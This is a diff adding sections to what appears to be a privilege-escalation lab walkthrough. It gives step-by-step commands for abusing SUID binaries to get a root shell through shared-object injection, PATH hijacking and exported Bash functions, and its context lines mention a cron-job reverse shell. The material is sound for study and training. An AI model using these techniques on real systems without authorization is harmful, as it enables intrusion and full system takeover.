@@ -475,3 +475,199 @@ This will open port `4444` and wait for incoming connections from the reverse sh
 ---
 
 Once the cron job runs the `overwrite.sh` script, it should execute the reverse shell, connecting back to your Netcat listener.
+
+# 🧑‍💻 SUID Known Exploits
+
+
+### 1. **Find SUID and SGID Files**
+
+Run the following command to find files with SUID/SGID bits set:
+
+```bash
+find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+
+---
+
+### 2. **Analyze the Found Files**
+
+Check if the found SUID/SGID files are essential or pose a risk:
+
+- **Common safe files**: `/bin/passwd`, `/usr/bin/sudo`, `/bin/su`.
+- **Investigate**: Custom, old, or rarely used binaries.
+
+---
+
+### 3. **Check Vulnerabilities**
+
+Use these tools to search for exploits related to each SUID/SGID file:
+
+- **[Exploit-DB](https://www.exploit-db.com/)**: Search for the binary name.
+- **[GTFOBins](https://gtfobins.github.io/)**: Search for the binary to see known exploitation techniques.
+
+  # 🗂️ SUID Shared object injection
+
+### 1. **Execute the SUID Program**
+
+Run the vulnerable **SUID** program to observe its current behavior:
+
+```bash
+/usr/local/bin/suid-so
+```
+
+You will see that it displays a progress bar before exiting.
+
+---
+
+### 2. **Use `strace` to Identify Missing Shared Objects**
+
+Run `strace` to inspect the system calls made by the program, specifically looking for missing files like shared objects:
+
+```bash
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
+
+You’ll notice it tries to load a shared object from your home directory:  
+`/home/user/.config/libcalc.so`, but this file does not exist.
+
+---
+
+### 3. **Create the Required Directory**
+
+Since the program expects the `.so` file in a non-existent directory, create the directory:
+
+```bash
+mkdir /home/user/.config
+```
+
+---
+
+### 4. **Compile the Shared Object**
+
+There is an example shared object code available at `/home/user/tools/suid/libcalc.c` that spawns a Bash shell. Compile it into the required shared object:
+
+```bash
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+
+---
+
+### 5. **Execute the Vulnerable Program**
+
+Now, run the vulnerable **SUID** program again:
+
+```bash
+/usr/local/bin/suid-so
+```
+
+This time, instead of the progress bar, you will gain a **root shell**.
+
+
+# 📜 SUID Environment Variables
+
+### 1. **Execute the SUID Program**
+
+Run the vulnerable **SUID** program to see what it does:
+
+```bash
+/usr/local/bin/suid-env
+```
+
+You'll notice it tries to start the **apache2** web server.
+
+---
+
+### 2. **Use `strings` to Inspect the Binary**
+
+Run the `strings` command on the executable to view readable text within the binary:
+
+```bash
+strings /usr/local/bin/suid-env
+```
+
+In the output, you'll see a line like this:
+
+```bash
+service apache2 start
+```
+
+This indicates that the program tries to call the `service` command, but it does not use the full path (`/usr/sbin/service`).
+
+---
+
+### 3. **Compile a Malicious `service` Program**
+
+To exploit the missing absolute path, compile a malicious `service` program that spawns a **Bash shell**. The source code is located at `/home/user/tools/suid/service.c`. Compile it into an executable called `service`:
+
+```bash
+gcc -o service /home/user/tools/suid/service.c
+```
+
+---
+
+### 4. **Modify the `PATH` Environment Variable**
+
+Prepend the current directory (`.`) to the `PATH` environment variable so that your malicious `service` executable is executed instead of the legitimate one:
+
+```bash
+PATH=.:$PATH /usr/local/bin/suid-env
+```
+
+---
+
+### 5. **Gain Root Shell**
+
+After running the command, the **SUID** program will execute your custom `service` binary, and you'll gain a **root shell**.
+
+# 🛠️ SUID Abusing shell features
+
+### 1. **Verify the Use of Absolute Path**
+
+Use `strings` to check the content of the `/usr/local/bin/suid-env2` binary and confirm that it uses the absolute path for the `service` command:
+
+```bash
+strings /usr/local/bin/suid-env2
+```
+
+You should see that it calls `/usr/sbin/service` to start the **apache2** web server.
+
+---
+
+### 2. **Check Bash Version**
+
+Ensure the installed version of Bash on your system is **less than 4.2-048**. This vulnerability exists in older Bash versions, where shell functions can override executables:
+
+```bash
+/bin/bash --version
+```
+
+If the version is below **4.2-048**, you can proceed with the exploit.
+
+---
+
+### 3. **Create a Malicious Bash Function**
+
+Create a Bash function named `/usr/sbin/service` that spawns a privileged **Bash shell** (`-p` to preserve permissions). Export this function so that the **SUID** program uses it instead of the real `/usr/sbin/service`:
+
+```bash
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+```
+
+---
+
+### 4. **Run the Vulnerable Program**
+
+Now, execute the `/usr/local/bin/suid-env2` program:
+
+```bash
+/usr/local/bin/suid-env2
+```
+
+---
+
+### 5. **Gain Root Shell**
+
+Instead of starting the actual **apache2** web server, your exported Bash function will be executed, giving you a **root shell**.
+
+
